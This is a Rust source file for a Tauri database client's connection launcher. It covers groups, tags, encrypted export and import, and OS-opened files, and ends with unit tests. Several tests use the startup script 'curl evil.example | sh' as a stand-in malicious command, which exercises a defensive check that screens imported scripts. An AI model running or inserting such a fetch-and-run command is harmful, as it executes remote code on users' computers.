//! The launcher's connection management beyond saving and deleting: groups, tags, duplicates, "ask every time"
//! passwords, connections exported to and imported from a file, and the files and links the OS asks the app to open.

use crate::error::{Error, Result};
use crate::store::{self, ConnectionsFile, Group, PasswordMode, Saved, Secret, Tag};
use aes_gcm::Aes256Gcm;
use aes_gcm::aead::{Aead, KeyInit};
use argon2::{Algorithm, Argon2, Params, Version};
use secrecy::{ExposeSecret, SecretBox, SecretSlice, SecretString};
use serde::{Deserialize, Serialize, Serializer};
use std::collections::HashMap;
use std::fmt::Write as _;
use std::path::{Path, PathBuf};
use std::sync::{Mutex, PoisonError};
use tauri::{AppHandle, Emitter, Manager, State};

/// Keychain access and argon2 block, so commands run them off the async runtime.
async fn blocking<T: Send + 'static>(f: impl FnOnce() -> Result<T> + Send + 'static) -> Result<T> {
    tauri::async_runtime::spawn_blocking(f).await?
}

/// Connections, groups and tags, for the launcher.
#[tauri::command]
pub async fn launcher(app: AppHandle) -> Result<ConnectionsFile> {
    let dir = crate::dir(&app)?;
    blocking(move || store::load_all(&dir)).await
}

/// Returns the copy's name.
#[tauri::command]
pub async fn duplicate_connection(app: AppHandle, name: String) -> Result<String> {
    let dir = crate::dir(&app)?;
    blocking(move || store::duplicate(&dir, &name)).await
}

#[tauri::command]
pub async fn move_to_group(app: AppHandle, names: Vec<String>, group: String) -> Result<()> {
    let dir = crate::dir(&app)?;
    blocking(move || store::move_to_group(&dir, &names, &group)).await
}

#[tauri::command]
pub async fn save_group(app: AppHandle, group: Group, previous: Option<String>) -> Result<()> {
    let dir = crate::dir(&app)?;
    blocking(move || store::save_group(&dir, group, previous.as_deref())).await
}

#[tauri::command]
pub async fn delete_group(app: AppHandle, name: String) -> Result<()> {
    let dir = crate::dir(&app)?;
    blocking(move || store::delete_group(&dir, &name)).await
}

#[tauri::command]
pub async fn save_tag(app: AppHandle, tag: Tag, previous: Option<String>) -> Result<()> {
    let dir = crate::dir(&app)?;
    blocking(move || store::save_tag(&dir, tag, previous.as_deref())).await
}

#[tauri::command]
pub async fn delete_tag(app: AppHandle, name: String) -> Result<()> {
    let dir = crate::dir(&app)?;
    blocking(move || store::delete_tag(&dir, &name)).await
}

/// The password typed for an "ask every time" connection, kept until the workspace closes (`None`) or the app quits.
#[tauri::command]
#[expect(clippy::needless_pass_by_value, reason = "Tauri hands command arguments over by value")]
pub fn set_session_password(name: String, password: Option<SecretString>) {
    store::set_session_password(&name, password);
}

// ---------- Export and import ----------

/// Which connections to export.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields, rename_all = "snake_case", tag = "kind", content = "name")]
pub enum Scope {
    All,
    Group(String),
    Connection(String),
}

/// The file format's version; a file from a newer one is refused rather than half-read.
const FORMAT: u32 = 1;
/// An export with thousands of connections is still well under this.
const MAX_FILE: u64 = 10 * 1024 * 1024;
const MAX_CONNECTIONS: usize = 10_000;

/// An exported connections file: the payload in the clear, or sealed with a password.
#[derive(Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
struct ExportFile {
    table_minus_connections: u32,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    data: Option<Payload>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    sealed: Option<Sealed>,
}

#[derive(Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
struct Payload {
    saved: ConnectionsFile,
    /// Only ever written sealed; see [`export`].
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    secrets: Vec<Secrets>,
}

#[derive(Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
struct Secrets {
    name: String,
    #[serde(default, serialize_with = "expose")]
    password: Option<SecretString>,
    #[serde(default, serialize_with = "expose")]
    ssh: Option<SecretString>,
}

/// Writes a secret into the payload, which is serialized only to be sealed.
#[expect(clippy::ref_option, reason = "serde's serialize_with passes a reference to the field")]
fn expose<S: Serializer>(s: &Option<SecretString>, ser: S) -> std::result::Result<S::Ok, S::Error> {
    s.as_ref().map(ExposeSecret::expose_secret).serialize(ser)
}

/// AES-256-GCM over the payload, with the key derived from the password by argon2id. Hex keeps the file plain JSON.
#[derive(Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
struct Sealed {
    salt: String,
    nonce: String,
    data: String,
}

/// Fixed rather than the crate's defaults, so a crate update can't make old files unreadable.
fn key(password: &SecretString, salt: &[u8]) -> Result<SecretBox<[u8; 32]>> {
    let crypto = |e: argon2::Error| Error::Crypto(e.to_string());
    let params = Params::new(19 * 1024, 2, 1, Some(32)).map_err(crypto)?;
    let mut key = SecretBox::new(Box::new([0u8; 32]));
    Argon2::new(Algorithm::Argon2id, Version::V0x13, params)
        .hash_password_into(
            password.expose_secret().as_bytes(),
            salt,
            secrecy::ExposeSecretMut::expose_secret_mut(&mut key),
        )
        .map_err(crypto)?;
    Ok(key)
}

fn cipher(password: &SecretString, salt: &[u8]) -> Result<Aes256Gcm> {
    Aes256Gcm::new_from_slice(key(password, salt)?.expose_secret()).map_err(|e| Error::Crypto(e.to_string()))
}

fn random<const N: usize>() -> Result<[u8; N]> {
    let mut b = [0u8; N];
    getrandom::fill(&mut b).map_err(|e| Error::Crypto(e.to_string()))?;
    Ok(b)
}

fn seal(password: &SecretString, plain: &SecretSlice<u8>) -> Result<Sealed> {
    let (salt, nonce) = (random::<16>()?, random::<12>()?);
    let data = cipher(password, &salt)?
        .encrypt(&nonce.into(), plain.expose_secret())
        .map_err(|e| Error::Crypto(e.to_string()))?;
    Ok(Sealed { salt: hex(&salt), nonce: hex(&nonce), data: hex(&data) })
}

fn unseal(password: &SecretString, sealed: &Sealed) -> Result<SecretSlice<u8>> {
    let nonce: [u8; 12] = unhex(&sealed.nonce)?.try_into().map_err(|_| Error::FileUnsealFailed)?;
    let plain = cipher(password, &unhex(&sealed.salt)?)?
        .decrypt(&nonce.into(), unhex(&sealed.data)?.as_slice())
        .map_err(|_| Error::FileUnsealFailed)?;
    Ok(plain.into())
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().fold(String::with_capacity(bytes.len() * 2), |mut s, b| {
        let _ = write!(s, "{b:02x}"); // writing to a String can't fail
        s
    })
}

fn unhex(s: &str) -> Result<Vec<u8>> {
    if !s.len().is_multiple_of(2) {
        return Err(Error::FileUnsealFailed);
    }
    (0..s.len())
        .step_by(2)
        .map(|i| s.get(i..i + 2).and_then(|pair| u8::from_str_radix(pair, 16).ok()).ok_or(Error::FileUnsealFailed))
        .collect()
}

/// Writes the chosen connections, with the groups and tags they use, to `path`. Passwords go in only when the file
/// is sealed with a password. Returns how many connections were written.
fn export(
    dir: &Path,
    path: &Path,
    scope: &Scope,
    password: Option<&SecretString>,
    include_passwords: bool,
) -> Result<usize> {
    let all = store::load_all(dir)?;
    let connections: Vec<Saved> = all
        .connections
        .into_iter()
        .filter(|c| match scope {
            Scope::All => true,
            Scope::Group(g) => c.group == *g,
            Scope::Connection(n) => c.name == *n,
        })
        .collect();
    if connections.is_empty() {
        return Err(Error::Invalid("there are no connections to export"));
    }
    let password = password.filter(|p| !p.expose_secret().is_empty());
    let secrets = match (include_passwords, password) {
        (false, _) => vec![],
        (true, None) => return Err(Error::Invalid("passwords are only exported into a password-protected file")),
        (true, Some(_)) => connections
            .iter()
            .map(|c| {
                let keychain = c.password_mode == PasswordMode::Keychain;
                Ok(Secrets {
                    name: c.name.clone(),
                    password: if keychain { store::stored(Secret::Database, &c.name)? } else { None },
                    ssh: if c.ssh.is_some() { store::stored(Secret::Ssh, &c.name)? } else { None },
                })
            })
            .collect::<Result<_>>()?,
    };
    let used = |name: &str, f: fn(&Saved) -> &str| connections.iter().any(|c| f(c) == name);
    let groups = all.groups.into_iter().filter(|g| used(&g.name, |c| &c.group)).collect();
    let tags = all.tags.into_iter().filter(|t| used(&t.name, |c| &c.tag)).collect();
    let n = connections.len();
    let payload = Payload { saved: ConnectionsFile { connections, groups, tags }, secrets };
    let file = match password {
        None => ExportFile { table_minus_connections: FORMAT, data: Some(payload), sealed: None },
        Some(pw) => {
            let plain = SecretSlice::from(serde_json::to_vec(&payload)?);
            ExportFile { table_minus_connections: FORMAT, data: None, sealed: Some(seal(pw, &plain)?) }
        }
    };
    crate::locations::write_safely(path, &serde_json::to_vec_pretty(&file)?)?;
    Ok(n)
}

/// Adds the connections in an exported file, renaming any whose name is taken. Returns how many were added.
/// What to do with imported connections' startup scripts, which run as shell commands on this computer before
/// connecting. Without a choice, a file that has any is refused with [`Error::ImportHasScripts`] listing them.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Scripts {
    Keep,
    Drop,
}

/// How many scripts [`Error::ImportHasScripts`] shows in full.
const SCRIPTS_SHOWN: usize = 20;

/// Refuses, keeps or drops the startup scripts in `incoming`; see [`Scripts`].
fn screen_scripts(incoming: &mut ConnectionsFile, scripts: Option<Scripts>) -> Result<()> {
    let has = |c: &Saved| !c.options.startup_script.trim().is_empty();
    match scripts {
        Some(Scripts::Keep) => Ok(()),
        Some(Scripts::Drop) => {
            incoming.connections.iter_mut().for_each(|c| c.options.startup_script.clear());
            Ok(())
        }
        None => {
            let with: Vec<&Saved> = incoming.connections.iter().filter(|c| has(c)).collect();
            if with.is_empty() {
                return Ok(());
            }
            let mut text = String::from("These connections run a shell command on this computer before connecting:\n");
            for c in with.iter().take(SCRIPTS_SHOWN) {
                let _ = write!(text, "\n{}:\n{}\n", c.name, c.options.startup_script.trim()); // writing to a String can't fail
            }
            if with.len() > SCRIPTS_SHOWN {
                let _ = write!(text, "\n…and {} more.\n", with.len() - SCRIPTS_SHOWN); // as above
            }
            Err(Error::ImportHasScripts(text))
        }
    }
}

fn import(dir: &Path, path: &Path, password: Option<&SecretString>, scripts: Option<Scripts>) -> Result<usize> {
    let failed = |source| Error::File { path: path.display().to_string(), source };
    if std::fs::metadata(path).map_err(failed)?.len() > MAX_FILE {
        return Err(Error::Invalid("the file is over 10 MB, too big for a connections export"));
    }
    let not_ours = |_| Error::Invalid("not a TableMinus connections file");
    let file: ExportFile = serde_json::from_slice(&std::fs::read(path).map_err(failed)?).map_err(not_ours)?;
    if file.table_minus_connections > FORMAT {
        return Err(Error::Invalid("the file is from a newer TableMinus; update the app to import it"));
    }
    let mut payload: Payload = match (file.data, file.sealed) {
        (Some(p), None) => p,
        (None, Some(sealed)) => {
            let plain = unseal(password.ok_or(Error::FilePasswordRequired)?, &sealed)?;
            serde_json::from_slice(plain.expose_secret()).map_err(not_ours)?
        }
        _ => return Err(Error::Invalid("not a TableMinus connections file")),
    };
    if payload.saved.connections.len() > MAX_CONNECTIONS {
        return Err(Error::Invalid("the file has more than 10,000 connections"));
    }
    screen_scripts(&mut payload.saved, scripts)?;
    let secrets: HashMap<_, _> = payload.secrets.into_iter().map(|s| (s.name, (s.password, s.ssh))).collect();
    store::add_imported(dir, payload.saved, &secrets)
}

/// Returns how many connections were written.
#[tauri::command]
pub async fn export_connections(
    app: AppHandle,
    path: PathBuf,
    scope: Scope,
    password: Option<SecretString>,
    include_passwords: bool,
) -> Result<usize> {
    let dir = crate::dir(&app)?;
    blocking(move || export(&dir, &path, &scope, password.as_ref(), include_passwords)).await
}

/// Returns how many connections were added. A sealed file without `password` fails with [`Error::FilePasswordRequired`],
/// one with startup scripts and no `scripts` choice with [`Error::ImportHasScripts`].
#[tauri::command]
pub async fn import_connections(
    app: AppHandle,
    path: PathBuf,
    password: Option<SecretString>,
    scripts: Option<Scripts>,
) -> Result<usize> {
    let dir = crate::dir(&app)?;
    blocking(move || import(&dir, &path, password.as_ref(), scripts)).await
}

// ---------- Files and links opened from the OS ----------

/// `.sqlite` files and `postgresql://`-style links the OS asked the app to open, until the UI takes them. They can
/// arrive before the page has loaded, so they wait here rather than going out only as an event.
#[derive(Default)]
pub struct Opened(Mutex<Vec<String>>);

/// Called for the app's run events; macOS delivers opened files and links as `Opened`.
pub fn on_event(app: &AppHandle, event: tauri::RunEvent) {
    #[cfg(target_os = "macos")]
    if let tauri::RunEvent::Opened { urls } = event {
        let items = urls.into_iter().map(|u| match u.to_file_path() {
            Ok(p) if u.scheme() == "file" => p.display().to_string(),
            _ => u.to_string(),
        });
        app.state::<Opened>().0.lock().unwrap_or_else(PoisonError::into_inner).extend(items);
        // Nobody listens before the page loads; it takes what waits at startup instead.
        let _ = app.emit("opened", ());
    }
    #[cfg(not(target_os = "macos"))]
    let _ = (app, event);
}

/// The files and links waiting to be opened; each is handed over once.
#[tauri::command]
#[expect(clippy::needless_pass_by_value, reason = "Tauri hands command arguments over by value")]
pub fn take_opened(opened: State<'_, Opened>) -> Vec<String> {
    std::mem::take(&mut *opened.0.lock().unwrap_or_else(PoisonError::into_inner))
}

#[cfg(test)]
mod tests {
    use super::{Scope, Scripts, export, import};
    use crate::error::Error;
    use crate::store::{self, ConnectionsFile, Group, GroupIcon, PasswordMode, Saved, Tag};
    use secrecy::SecretString;
    use std::path::PathBuf;

    fn temp_dir(test: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("tableminus-{}-launcher-{test}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir); // a leftover from an earlier run, or nothing
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    /// No keychain password (`NoPassword`), so these tests never touch the real keychain.
    fn conn(name: &str, group: &str) -> Saved {
        serde_json::from_value(serde_json::json!({
            "name": name, "kind": "postgres", "url": "postgres://u@h/db", "group": group, "tag": "staging",
            "password_mode": "no_password",
        }))
        .unwrap()
    }

    fn setup(dir: &std::path::Path) {
        let file = ConnectionsFile {
            connections: vec![conn("a", "work"), conn("b", "")],
            groups: vec![Group { name: "work".into(), icon: GroupIcon::Server }],
            ..ConnectionsFile::default()
        };
        store::write(dir, &file).unwrap();
    }

    #[test]
    fn export_of_a_group_holds_only_its_connections_group_and_tags() {
        let dir = temp_dir("group");
        setup(&dir);
        let out = dir.join("out.json");
        assert_eq!(export(&dir, &out, &Scope::Group("work".into()), None, false).unwrap(), 1);
        let text = std::fs::read_to_string(&out).unwrap();
        let v: serde_json::Value = serde_json::from_str(&text).unwrap();
        let saved = &v["data"]["saved"];
        assert_eq!(saved["connections"].as_array().unwrap().len(), 1);
        assert_eq!(saved["groups"][0]["icon"], "server");
        assert_eq!(saved["tags"].as_array().unwrap().iter().map(|t| &t["name"]).collect::<Vec<_>>(), ["staging"]);
    }

    #[test]
    fn export_refuses_passwords_without_a_file_password() {
        let dir = temp_dir("refuse");
        setup(&dir);
        let out = dir.join("out.json");
        let err = export(&dir, &out, &Scope::All, None, true).unwrap_err();
        assert!(err.to_string().contains("password-protected"), "{err}");
        assert!(!out.exists());
    }

    #[test]
    fn sealed_export_imports_only_with_the_right_password() {
        let dir = temp_dir("sealed");
        setup(&dir);
        let out = dir.join("out.json");
        let pw = SecretString::from("correct horse");
        export(&dir, &out, &Scope::All, Some(&pw), true).unwrap();
        let text = std::fs::read_to_string(&out).unwrap();
        assert!(!text.contains("postgres://") && text.contains("sealed"), "the payload is not in the clear");

        assert!(matches!(import(&dir, &out, None, None), Err(Error::FilePasswordRequired)));
        assert!(matches!(import(&dir, &out, Some(&"wrong".into()), None), Err(Error::FileUnsealFailed)));
        assert_eq!(import(&dir, &out, Some(&pw), None).unwrap(), 2);
        let names: Vec<_> = store::load(&dir).unwrap().into_iter().map(|c| c.name).collect();
        assert_eq!(names, ["a", "a 2", "b", "b 2"], "imported copies get free names");
    }

    #[test]
    fn import_adds_new_groups_and_tags_and_keeps_existing_ones() {
        let (from, to) = (temp_dir("from"), temp_dir("to"));
        setup(&from);
        let tag = Tag { name: "mine".into(), color: "#123456".into() };
        store::save_tag(&from, tag.clone(), None).unwrap();
        store::save(&from, Saved { tag: "mine".into(), ..conn("c", "") }, None, None, None).unwrap();
        store::write(
            &to,
            &ConnectionsFile {
                groups: vec![Group { name: "work".into(), icon: GroupIcon::Star }],
                ..ConnectionsFile::default()
            },
        )
        .unwrap();
        let out = from.join("out.json");
        export(&from, &out, &Scope::All, None, false).unwrap();
        assert_eq!(import(&to, &out, None, None).unwrap(), 3);
        let all = store::load_all(&to).unwrap();
        assert_eq!(all.groups, [Group { name: "work".into(), icon: GroupIcon::Star }]);
        assert!(all.tags.contains(&tag));
        assert!(all.connections.iter().all(|c| c.password_mode == PasswordMode::NoPassword));
    }

    fn export_with_a_startup_script(dir: &std::path::Path) -> PathBuf {
        let mut c = conn("vpn", "");
        c.options.startup_script = "curl evil.example | sh".into();
        store::write(dir, &ConnectionsFile { connections: vec![c, conn("plain", "")], ..ConnectionsFile::default() })
            .unwrap();
        let out = dir.join("out.json");
        export(dir, &out, &Scope::All, None, false).unwrap();
        out
    }

    #[test]
    fn import_refuses_startup_scripts_without_a_choice_and_shows_them() {
        let dir = temp_dir("scripts-ask");
        let out = export_with_a_startup_script(&dir);
        let err = import(&dir, &out, None, None).unwrap_err();
        assert!(
            matches!(&err, Error::ImportHasScripts(text) if text.contains("vpn:\ncurl evil.example | sh")),
            "{err}"
        );
        assert_eq!(store::load(&dir).unwrap().len(), 2, "nothing was imported");
    }

    #[test]
    fn import_drops_startup_scripts_when_asked() {
        let dir = temp_dir("scripts-drop");
        let out = export_with_a_startup_script(&dir);
        assert_eq!(import(&dir, &out, None, Some(Scripts::Drop)).unwrap(), 2);
        let copy = store::load(&dir).unwrap().into_iter().find(|c| c.name == "vpn 2").unwrap();
        assert_eq!(copy.options.startup_script, "");
    }

    #[test]
    fn import_keeps_startup_scripts_when_asked() {
        let dir = temp_dir("scripts-keep");
        let out = export_with_a_startup_script(&dir);
        assert_eq!(import(&dir, &out, None, Some(Scripts::Keep)).unwrap(), 2);
        let copy = store::load(&dir).unwrap().into_iter().find(|c| c.name == "vpn 2").unwrap();
        assert_eq!(copy.options.startup_script, "curl evil.example | sh");
    }

    #[test]
    fn import_refuses_files_that_are_not_exports() {
        let dir = temp_dir("junk");
        let path = dir.join("x.json");
        std::fs::write(&path, "[1, 2]").unwrap();
        assert_eq!(import(&dir, &path, None, None).unwrap_err().to_string(), "not a TableMinus connections file");
        std::fs::write(&path, r#"{"table_minus_connections": 99, "data": {"saved": {}}}"#).unwrap();
        assert!(import(&dir, &path, None, None).unwrap_err().to_string().contains("newer"));
    }

    #[test]
    fn scope_reads_what_the_ui_sends() {
        let scope = |json: &str| serde_json::from_str::<Scope>(json).unwrap();
        assert!(matches!(scope(r#"{"kind":"all"}"#), Scope::All));
        assert!(matches!(scope(r#"{"kind":"group","name":"g"}"#), Scope::Group(g) if g == "g"));
        assert!(serde_json::from_str::<Scope>(r#"{"kind":"all","extra":1}"#).is_err());
    }

    #[test]
    fn hex_round_trips() {
        assert_eq!(super::unhex(&super::hex(&[0, 15, 255])).unwrap(), [0, 15, 255]);
        assert!(super::unhex("abc").is_err() && super::unhex("zz").is_err());
    }
}
